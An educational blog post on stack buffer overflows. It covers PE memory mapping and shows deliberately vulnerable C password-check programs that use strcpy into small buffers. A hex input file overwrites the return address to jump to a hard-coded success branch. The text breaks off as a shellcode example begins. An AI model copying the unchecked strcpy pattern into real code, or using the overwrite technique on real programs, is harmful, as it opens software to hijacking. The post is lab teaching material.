<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="A bug that can cause software to do something beyond the scope of the vulnerability is called a vulnerability, this article writes some simple buffer overflow vulnerability exploitation shallow analysis"><title>Exploit Learning Notes 001 Buffer Overflow</title><link rel=canonical href=https://blog.moeomu.com/posts/exploit-learning-notes-001-buffer-overflow/><link rel=stylesheet href=/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css><meta property="og:title" content="Exploit Learning Notes 001 Buffer Overflow"><meta property="og:description" content="A bug that can cause software to do something beyond the scope of the vulnerability is called a vulnerability, this article writes some simple buffer overflow vulnerability exploitation shallow analysis"><meta property="og:url" content="https://blog.moeomu.com/posts/exploit-learning-notes-001-buffer-overflow/"><meta property="og:site_name" content="Misaka's Secrect Garden"><meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:tag" content="Windows"><meta property="article:tag" content="StackOverflow"><meta property="article:published_time" content="2020-10-18T10:00:00+08:00"><meta property="article:modified_time" content="2020-10-18T10:00:00+08:00"><meta name=twitter:title content="Exploit Learning Notes 001 Buffer Overflow"><meta name=twitter:description content="A bug that can cause software to do something beyond the scope of the vulnerability is called a vulnerability, this article writes some simple buffer overflow vulnerability exploitation shallow analysis"><script async src=https://umami.moeomu.com/Prototype data-website-id=da63d88b-4c19-4ee6-93cc-e12bd941eb81></script></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu5c4b01d6d06a4818a5284ca6e51e5ac9_24136_300x0_resize_q75_box.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a>
<span class=emoji>üç•</span></figure><div class=site-meta><h1 class=site-name><a href=/>Misaka's Secrect Garden</a></h1><h2 class=site-description>In the gardens embrace, a celestial sprite dances.</h2></div></header><ol class=social-menu><li><a href=https://github.com/Misakaou target=_blank title=GitHub rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com target=_blank title=Twitter rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg><span>Home</span></a></li><li><a href=/archives/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg><span>Archives</span></a></li><li><a href=/search/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg><span>Search</span></a></li><li><a href=/links/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg><span>Links</span></a></li><li><a href=/comment/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-messages" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M21 14l-3-3h-7a1 1 0 01-1-1V4a1 1 0 011-1h9a1 1 0 011 1v10"/><path d="M14 15v2a1 1 0 01-1 1H6l-3 3V11a1 1 0 011-1h2"/></svg><span>Comment</span></a></li><li><a href=/about/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg><span>About</span></a></li><div class=menu-bottom-section><li id=i18n-switch><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 5h7"/><path d="M9 3v2c0 4.418-2.239 8-5 8"/><path d="M5 9c-.003 2.144 2.952 3.908 6.7 4"/><path d="M12 20l4-9 4 9"/><path d="M19.1 18h-6.2"/></svg><select name=language onchange="window.location.href=this.selectedOptions[0].value"><option value=https://blog.moeomu.com/ selected>English</option><option value=https://blog.moeomu.com/zh-cn/>‰∏≠Êñá</option></select></li><li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><span>Dark Mode</span></li></div></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#pe-concepts>PE concepts</a><ol><li><a href=#mapping-between-pe-file-and-virtual-memory>Mapping between PE file and virtual memory</a></li><li><a href=#data-complementary-padding-rules>Data Complementary Padding Rules</a></li><li><a href=#function-calling-convention>Function calling convention</a></li><li><a href=#buffer-overflow>Buffer overflow</a></li></ol></li><li><a href=#shellcode>ShellCode</a><ol><li><a href=#exploitshellcodepayload-division-of-labor>Exploit/ShellCode(Payload) division of labor</a></li><li><a href=#example>Example</a><ol><li><a href=#buffer-overflow-control-program-flag>Buffer Overflow Control Program Flag</a></li><li><a href=#hard-coded-address-control-program-flow>Hard-coded address control program flow</a></li><li><a href=#added-attack-load-shellcode>added attack load (ShellCode)</a></li></ol></li></ol></li><li><a href=#summary>Summary</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/exploit/>Exploit</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/posts/exploit-learning-notes-001-buffer-overflow/>Exploit Learning Notes 001 Buffer Overflow</a></h2><h3 class=article-subtitle>A bug that can cause software to do something beyond the scope of the vulnerability is called a vulnerability, this article writes some simple buffer overflow vulnerability exploitation shallow analysis</h3></div><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg><time class=article-time--published>Oct 18, 2020</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg><time class=article-time--reading>7 minute read</time></div></footer><footer class=article-translations><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 5h7"/><path d="M9 3v2c0 4.418-2.239 8-5 8"/><path d="M5 9c-.003 2.144 2.952 3.908 6.7 4"/><path d="M12 20l4-9 4 9"/><path d="M19.1 18h-6.2"/></svg><div><a href=https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-001-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/ class=link>‰∏≠Êñá</a></div></footer></div></header><section class=article-content><blockquote><ul><li>Functional logic bugs (Bugs)</li><li>Security Logic Flaw (Vulnerability)</li></ul><p><a class=link href=exploit-study-01.zip>Click here to download this article with code, executable, shellcode file</a></p></blockquote><p>Source: <a class=link href=/posts/exploit-learning-notes-001-buffer-overflow/>Moeomu&rsquo;s blog</a></p><h2 id=pe-concepts>PE concepts</h2><h3 id=mapping-between-pe-file-and-virtual-memory>Mapping between PE file and virtual memory</h3><ul><li>ImageBase: load base address, 0x00400000 for (.EXE), 0x10000000 for (.DLL)</li><li>FileOffset: file offset address</li><li>VirtualAddress: virtual address, is the address mapped to memory</li><li>RelativeVirtualAddress: Relative virtual address, is the offset of the virtual address VA relative to the load base address</li></ul><blockquote><p>VA = ImageBase + RVA</p></blockquote><h3 id=data-complementary-padding-rules>Data Complementary Padding Rules</h3><ul><li>When on disk, each section (.section) of the PE file is stored in 0x200 bytes, when the size of the section is less than 0x200, use 0x0 to fill, when the size of the section exceeds 0x200, allocate the next 0x200 size to this section</li><li>When in memory, each section (.section) of a PE file is stored in units of 0x1000 bytes, with the same rules as above</li></ul><blockquote><p>SectionOffset = RVA - FileOffset<br>FileOffset = VA - ImageBase - SectionOffset = RVA - SectionOffset</p><p>For example .text section RVA=0x1000, FileOffset=0x400, then SectionOffset=0xC00<br>Command file offset at 0x00404141 is 0x00404141 - 0x00400000 - (0x1000 - 0x400) = 0x3541</p></blockquote><h3 id=function-calling-convention>Function calling convention</h3><div class=table-wrapper><table><thead><tr><th>C</th><th>SysCall</th><th>StdCall</th><th>BASIC</th><th>FORTRAN</th><th>PASCAL</th></tr></thead><tbody><tr><td>Parameter stack order</td><td>right->left</td><td>right->left</td><td>right->left</td><td>left->right</td><td>left->right</td></tr><tr><td>Restore stack balance position</td><td>parent function</td><td>sub function</td><td>sub function</td><td>sub function</td><td>sub function</td></tr></tbody></table></div><h3 id=buffer-overflow>Buffer overflow</h3><blockquote><p>stack frames are adjacent, local variables are adjacent, and if the array is out of bounds, it overwrites the local variables and then the function return address<br>control program flow by flooding stack frame return address values</p></blockquote><hr><h2 id=shellcode>ShellCode</h2><h3 id=exploitshellcodepayload-division-of-labor>Exploit/ShellCode(Payload) division of labor</h3><ul><li>Exploit&rsquo;s role is to precisely exploit some kind of vulnerability with the goal of hijacking the EIP</li><li>ShellCode will execute malicious/goodwill code and is the attack payload</li><li>ShellCode is generally generic, Exploit can only work for a specific vulnerability</li></ul><h3 id=example>Example</h3><p>This example uses simple password authentication to test the vulnerability</p><hr><h4 id=buffer-overflow-control-program-flag>Buffer Overflow Control Program Flag</h4><h5 id=code-expstd0101>code (ExpStd0101)</h5><blockquote><p>Compile environment: Windows XP SP3, Visual C++ 6, Debug<br>Experimental environment: Windows XP SP3</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#define PASSWORD &#34;1234567&#34;
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>verify_password</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>password</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>authenticated</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>buffer</span><span class=p>[</span><span class=mi>8</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=n>authenticated</span> <span class=o>=</span> <span class=nf>strcmp</span><span class=p>(</span><span class=n>password</span><span class=p>,</span> <span class=n>PASSWORD</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>strcpy</span><span class=p>(</span><span class=n>buffer</span><span class=p>,</span> <span class=n>password</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>authenticated</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>valid_flag</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>password</span><span class=p>[</span><span class=mi>1024</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Input Number:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%s&#34;</span><span class=p>,</span> <span class=n>password</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>valid_flag</span> <span class=o>=</span> <span class=nf>verify_password</span><span class=p>(</span><span class=n>password</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>valid_flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;ERROR!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;OK!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h5 id=analysis-expstd0101>Analysis (ExpStd0101)</h5><ul><li><p>Simple analysis</p><ul><li>When input 999999999, its end <code>'\0'</code> will fill the 9th byte, exactly changing the lowest 1 byte of authenticated 0x1 to 0x0</li><li>This is also related to strcmp function, if <code>str1&lt;str2</code>, the authenticated value -1 is stored with inverse code <code>FFFFFFFF</code>, even if the low bit <code>FF</code> overflows to <code>00</code>, it is useless, so not all 8-bit characters can bypass authentication</li></ul></li><li><p>Further verification</p><ul><li>When 8 9s are entered, the 8-byte buffer is filled, covering 1 byte of authenticated space</li><li>When 11 9s are entered, the 8-byte buffer fills up and covers 4 bytes of authenticated space, i.e. authenticated is completely overwritten and it is flushed as <code>0x003939393939</code></li><li>When 15 9s are input, the 8-byte buffer is filled, covering 4 bytes of authenticated space, and the space where this function EBP is located is also covered (the content is the parent function EBP)</li><li>When 19 9s are entered, the 8-byte buffer is filled, the 4-byte authenticated space is overwritten, the 4-byte EBP space is overwritten, and the 4-byte return address is overwritten</li></ul></li><li><p>Further verification</p><ul><li>Since the keyboard can not enter some invisible characters, so replace it with read file authentication</li></ul></li></ul><hr><h4 id=hard-coded-address-control-program-flow>Hard-coded address control program flow</h4><p>Use FILE for file reading</p><h5 id=code-expstd0102>code (ExpStd0102)</h5><blockquote><p>Compile environment: Windows XP SP3, Visual C++ 6, Debug<br>Experimental environment: Windows XP SP3</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#define PASSWORD &#34;1234567&#34;
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>verify_password</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>password</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>authenticated</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>buffer</span><span class=p>[</span><span class=mi>8</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=n>authenticated</span> <span class=o>=</span> <span class=nf>strcmp</span><span class=p>(</span><span class=n>password</span><span class=p>,</span> <span class=n>PASSWORD</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>strcpy</span><span class=p>(</span><span class=n>buffer</span><span class=p>,</span> <span class=n>password</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>authenticated</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>valid_flag</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>password</span><span class=p>[</span><span class=mi>1024</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=n>FILE</span> <span class=o>*</span> <span class=n>fp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=n>fp</span> <span class=o>=</span> <span class=nf>fopen</span><span class=p>(</span><span class=s>&#34;password.txt&#34;</span><span class=p>,</span> <span class=s>&#34;rw+&#34;</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nf>fscanf</span><span class=p>(</span><span class=n>fp</span><span class=p>,</span> <span class=s>&#34;%s&#34;</span><span class=p>,</span> <span class=n>password</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>valid_flag</span> <span class=o>=</span> <span class=nf>verify_password</span><span class=p>(</span><span class=n>password</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>valid_flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;ERROR!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;OK!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nf>fclose</span><span class=p>(</span><span class=n>fp</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h5 id=analysis-expstd0102>Analysis (ExpStd0102)</h5><blockquote><p>first use a known address for shellcode, this address is compiled differently by different compilers and loaded differently by different systems, so it can only be used for testing</p></blockquote><ul><li>Necessary information<ul><li>Success branch address: <code>0x0040111F</code></li><li>Since memory is stored in reverse order, these values should be written in reverse order</li></ul></li><li>Edit password.txt in hexadecimal as follows</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=mi>34</span> <span class=mi>33</span> <span class=mi>32</span> <span class=mi>31</span> <span class=mi>34</span> <span class=mi>33</span> <span class=mi>32</span> <span class=mi>31</span> <span class=mi>34</span> <span class=mi>33</span> <span class=mi>32</span> <span class=mi>31</span> <span class=mi>34</span> <span class=mi>33</span> <span class=mi>32</span> <span class=mi>31</span> <span class=mi>34</span> <span class=mi>33</span> <span class=mi>32</span> <span class=mi>31</span>
</span></span><span class=line><span class=cl><span class=mf>1F</span> <span class=mi>11</span> <span class=mi>40</span> <span class=mo>00</span>
</span></span></code></pre></td></tr></table></div></div><ul><li>Run the program, at this point<ul><li>The stack address <code>0x0012FB24</code> holds the return address of the function <code>verify_password</code>.</li><li>This has been flushed to <code>0040111F</code>, which is the success branch address</li></ul></li><li>The success branch address is used instead of the return address, but the program crashes after displaying success because the stack is not balanced</li></ul><hr><h4 id=added-attack-load-shellcode>added attack load (ShellCode)</h4><p>Increase the size of the buffer to carry the attack load<br>Dynamically load DLL for API calls</p><h5 id=code-expstd0103>code (ExpStd0103)</h5><blockquote><p>Compile environment: Windows XP SP3, Visual C++ 6, Debug<br>Experimental environment: Windows XP SP3</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;windows.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#define PASSWORD &#34;1234567&#34;
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>verify_password</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>password</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>authenticated</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>buffer</span><span class=p>[</span><span class=mi>44</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=n>authenticated</span> <span class=o>=</span> <span class=nf>strcmp</span><span class=p>(</span><span class=n>password</span><span class=p>,</span> <span class=n>PASSWORD</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>strcpy</span><span class=p>(</span><span class=n>buffer</span><span class=p>,</span> <span class=n>password</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>authenticated</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
